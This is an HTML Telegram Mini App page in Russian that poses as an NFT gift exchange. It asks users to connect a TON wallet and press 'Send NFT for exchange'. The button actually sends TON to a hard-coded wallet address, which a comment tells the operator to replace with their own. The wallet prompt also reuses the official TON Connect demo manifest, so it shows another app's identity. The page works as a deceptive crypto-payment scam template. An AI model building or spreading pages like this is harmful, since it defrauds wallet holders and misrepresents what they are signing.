<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NFT Exchange Mini App</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <!-- Подключаем скрипт нового поколения (модуль) -->
    <script type="module">
        import 'https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js';
    </script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #182533;
            color: white;
            text-align: center;
            padding: 20px;
        }
        #ton-connect-btn {
            margin: 30px auto;
            display: flex;
            justify-content: center;
            min-height: 44px;
        }
        .btn-send {
            background-color: #2481cc;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            display: none;
            margin-top: 20px;
            width: 80%;
            max-width: 300px;
        }
    </style>
</head>
<body>

    <h2>🔄 Обмен NFT Подарков</h2>
    <p>Подключите кошелек для автоматического подтверждения сделки</p>

    <!-- Кнопка создается автоматически внутри этого тега -->
    <div id="ton-connect-btn"></div>

    <button id="send-nft-btn" class="btn-send">Отправить NFT на обмен</button>
    
    <div id="error-log" style="color: #ff6b6b; font-size: 12px; margin-top: 20px;"></div>

    <script type="module">
        // Ждем пока модуль импортирует класс в глобальную область
        window.addEventListener('load', async () => {
            try {
                if (window.Telegram && window.Telegram.WebApp) {
                    window.Telegram.WebApp.ready();
                    window.Telegram.WebApp.expand();
                }

                // Создаем подключение
                const tonConnectUI = new TONConnectUI.TonConnectUI({
                    manifestUrl: 'https://raw.githubusercontent.com/ton-connect/demo-dapp/main/public/tonconnect-manifest.json',
                    buttonRootId: 'ton-connect-btn'
                });

                const sendBtn = document.getElementById('send-nft-btn');

                tonConnectUI.onStatusChange(wallet => {
                    if (wallet) {
                        sendBtn.style.display = 'inline-block';
                    } else {
                        sendBtn.style.display = 'none';
                    }
                });

                sendBtn.addEventListener('click', async () => {
                    const transaction = {
                        validUntil: Math.floor(Date.now() / 1000) + 60,
                        messages: [
                            {
                                // ВСТАВЬ СЮДА СВОЙ АДРЕС ТОН-КОШЕЛЬКА:
                                address: "EQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM9c",
                                amount: "10000000" 
                            }
                        ]
                    };
                    try {
                        await tonConnectUI.sendTransaction(transaction);
                        alert("Успешно!");
                        if (window.Telegram && window.Telegram.WebApp) window.Telegram.WebApp.close();
                    } catch (e) {
                        alert("Ошибка транзакции.");
                    }
                });

            } catch (err) {
                document.getElementById('error-log').innerText = "Ошибка: " + err.message;
            }
        });
    </script>
</body>
</html>
